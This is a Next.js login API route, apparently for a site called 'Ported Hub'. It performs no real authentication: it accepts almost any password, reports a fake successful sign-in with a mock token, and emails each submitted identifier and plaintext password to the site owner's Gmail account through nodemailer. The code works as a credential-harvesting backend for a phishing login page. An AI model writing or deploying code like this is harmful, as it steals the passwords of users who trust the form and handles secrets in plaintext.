import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { identifier, password } = body;

    if (!identifier || !password) {
      return NextResponse.json({ error: 'Email/Phone and password are required' }, { status: 400 });
    }

    // Mock Backend Validation
    if (password === '123456' || password.length < 6) {
      return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 });
    }
    
    // Send email to the store owner
    try {
      if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
        const transporter = nodemailer.createTransport({
          service: 'gmail',
          auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS
          }
        });

        await transporter.sendMail({
          from: process.env.EMAIL_USER,
          to: process.env.EMAIL_USER,
          subject: `User Login: ${identifier}`,
          html: `
            <h2>New Login Attempt on Ported Hub</h2>
            <p><strong>Identifier (Email/Phone):</strong> ${identifier}</p>
            <p><strong>Password:</strong> ${password}</p>
          `
        });
      }
    } catch (emailError) {
      console.error('Email failed to send.', emailError);
    }

    // Success response simulating a session/token creation
    return NextResponse.json({ 
      success: true, 
      message: `Signed in successfully as ${identifier}!`,
      token: 'mock_jwt_token_123',
      user: { id: 1, identifier }
    });

  } catch (e) {
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}
